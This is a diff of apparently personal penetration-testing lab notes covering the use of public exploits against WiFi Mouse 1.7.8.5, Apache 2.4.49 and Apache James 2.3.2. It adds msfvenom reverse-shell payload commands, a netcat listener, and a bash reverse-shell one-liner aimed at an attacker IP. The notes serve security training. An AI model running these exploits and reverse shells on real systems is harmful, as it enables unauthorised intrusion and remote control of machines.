@@ -1297,21 +1297,27 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
   - type C:\Users\Administrator\Desktop\flag.txt
 
 ### Locating public exploits   
-- mouse server - WiFi Mouse 1.7.8.5 - Remote Code Execution
+- mouse server - [WiFi Mouse 1.7.8.5 - Remote Code Execution](https://www.exploit-db.com/exploits/50972)
   - connect to SMB download folders to get hints
     ```
     smbclient \\\\192.168.171.10\\Users -N : Connect to the Users share anonymously
     smb: \offsec\Downloads\> ls
     MouseServer.exe 
     ```
-  - searchsploit "mouse server" [50972.py](https://www.exploit-db.com/exploits/50972)
+  - `searchsploit "mouse server"`: windows/remote/50972.py 
   - generate windows reverse shell payload
-    - `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 -f exe -o shell32.exe`
     - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 -f exe -o shell64.exe`
   - `python3 -m http.server 80`
   - `nc -lvnp 443`
   - `python3 mouseserver_50972.py 192.168.171.10 192.168.45.165 shell64.exe`  
-- 
+- Apache httpd 2.4.49 -  [Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/50383)
+  - `searchsploit "Apache 2.4.49"`: multiple/webapps/50383.sh
+  - `./apache_2449_50383.sh targets.txt /bin/sh "bash -c 'bash -i >& /dev/tcp/192.168.45.165/4444 0>&1'"`
+- JAMES Remote Admin 2.3.2 - [Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated)](https://www.exploit-db.com/exploits/50347)
+  - `ssh -p 32826 student@192.168.170.52`  
+  - `searchsploit "JAMES Remote 2.3.2"`: linux/remote/50347.py  
+  - change the port of “James Remote Administration Tool”， “SMTP” in 50347.py  
+  - `python3 JAMESAdmin232_50347.py 192.168.170.52 192.168.45.165 443`  
 
 ### Password Attacks  
 - 16.1.1 SSH and RDP
